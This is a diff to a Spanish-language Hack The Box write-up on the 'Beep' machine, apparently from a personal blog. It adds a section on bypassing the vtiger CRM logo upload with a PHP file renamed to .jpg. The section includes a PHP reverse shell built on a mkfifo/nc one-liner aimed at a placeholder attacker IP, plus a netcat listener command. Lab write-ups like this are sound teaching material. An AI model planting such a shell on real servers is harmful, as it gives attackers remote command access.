@@ -250,10 +250,36 @@ Finalmente, presionaremos el botón `Send`, para que emitir nuestra petición.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/28.png)
 
+Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación.
+
 ### [](#header-4)Fase De Explotación - File Upload Bypass
 
-DEF
+Si recordamos, en la fase de explotación a través del uso de un _LFI_, habíamos descubierto un panel de login de `vtiger CRM`; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/29.png)
+
+Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado _Settings/Company Details_, vamos a ver que hay una opción que nos permite cambiar el logo de la compañia, por lo que ya vamos teniendo una idea, de que podemos hacer.
+
+De manera casi similar a la máquina [Vulnversity-TryHackMe](https://mateonitro550.github.io/Vulnversity-TryHackMe), vamos a tener que disfrazar un archivo `.php` como `.jpg`. No obstante, en este caso será un poco más sencillo ya que no haremos uso de `Burp Suite` (aunque podríamos); lo único que vamos a hacer es añadir la extensión `.jpg` a nuestra `reverseShell.php`.
+
+Podríamos utilizar la [_reverse shell_](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) que nos provee `pentestmonkey` (para lo cual debemos modificar el campo _ip_, y colocar la nuestra, y si quisiéramos el campo _port_), o bien, crear nuestra propia `reverse shell`.
+
+```php
+<?php
+	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <nuestraIP> <puertoCualquiera> >/tmp/f");
+?>
+```
+
+Y al igual que en los casos anteriores, previo a darle a `Save`, debemos de estar en escucha a través de `NetCat`, por el puerto que hayamos indicado en nuestra `reverse shell`.
+
+```
+sudo nc -nlvp <puertoCualquiera>
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/30.png)
+
+Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario `asterisk`, por lo que ahora si debemos de realizar la escalada de privilegios.
 
 ### [](#header-3)Escalada De Privilegios
 
-GHI
+
